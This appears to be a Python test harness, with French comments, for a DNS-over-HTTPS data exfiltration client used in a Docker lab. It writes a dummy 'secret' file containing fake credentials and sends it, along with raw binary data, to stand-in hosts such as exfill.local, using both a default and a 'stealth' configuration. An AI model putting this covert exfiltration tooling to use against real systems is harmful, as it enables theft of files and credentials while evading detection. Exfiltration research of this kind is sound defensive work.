#!/usr/bin/env python3
"""
Simple DoH Exfiltration Test

Test rapide du système d'exfiltration DoH
"""

import os
import sys
from client import DoHExfiltrationClient, create_default_config, create_stealth_config

def create_test_file():
    """Crée un fichier de test"""
    test_content = """🔐 SECRET DOCUMENT 🔐
====================

Company: ACME Corporation
Date: 2025-08-05

CONFIDENTIAL DATA:
- Admin password: SuperSecret123!
- API Key: sk-1234567890abcdef
- Database connection: postgresql://admin:secret@db.local:5432/maindb

This is a test file for DoH exfiltration research.
Contains multiple lines to test chunking capabilities.
🚀 Advanced DoH exfiltration techniques being tested!
"""
    
    with open('/app/secret_data.txt', 'w') as f:
        f.write(test_content)
    
    return '/app/secret_data.txt'

def main():
    print("🎯 DoH Exfiltration Quick Test")
    print("=" * 50)
    
    # Créer fichier de test
    test_file = create_test_file()
    print(f"📄 Created test file: {test_file}")
    
    # Test 1: Configuration par défaut
    print("\n🚀 Test 1: Default Configuration")
    print("-" * 30)
    
    config = create_default_config()
    # Utiliser l'environnement Docker
    config.doh_server = os.getenv('DOH_SERVER', 'https://doh.local/dns-query')
    config.target_domain = os.getenv('TARGET_DOMAIN', 'exfill.local')
    
    client = DoHExfiltrationClient(config)
    
    try:
        success = client.exfiltrate_file(test_file, "test_session_1")
        if success:
            print("✅ Test 1 completed successfully!")
        else:
            print("❌ Test 1 failed!")
    except Exception as e:
        print(f"💥 Test 1 error: {e}")
    
    print("\n🕵️ Test 2: Stealth Configuration")
    print("-" * 30)
    
    # Test 2: Configuration furtive
    stealth_config = create_stealth_config()
    stealth_config.doh_server = os.getenv('DOH_SERVER', 'https://doh.local/dns-query')
    stealth_config.target_domain = os.getenv('TARGET_DOMAIN', 'exfill.local')
    stealth_config.base_delay = 0.5  # Plus rapide pour les tests
    
    stealth_client = DoHExfiltrationClient(stealth_config)
    
    try:
        success = stealth_client.exfiltrate_file(test_file, "stealth_session_2")
        if success:
            print("✅ Test 2 completed successfully!")
        else:
            print("❌ Test 2 failed!")
    except Exception as e:
        print(f"💥 Test 2 error: {e}")
    
    # Test 3: Données brutes
    print("\n🔢 Test 3: Raw Data Exfiltration")
    print("-" * 30)
    
    raw_data = b"Binary data test: \x00\x01\x02\xFF\xFE credentials=admin:secret123"
    
    try:
        success = client.exfiltrate_data(raw_data, "binary_test", "raw_session_3")
        if success:
            print("✅ Test 3 completed successfully!")
        else:
            print("❌ Test 3 failed!")
    except Exception as e:
        print(f"💥 Test 3 error: {e}")
    
    print("\n🎉 DoH exfiltration tests completed!")
    print("📊 Check the interceptor logs for captured traffic.")

if __name__ == "__main__":
    main()
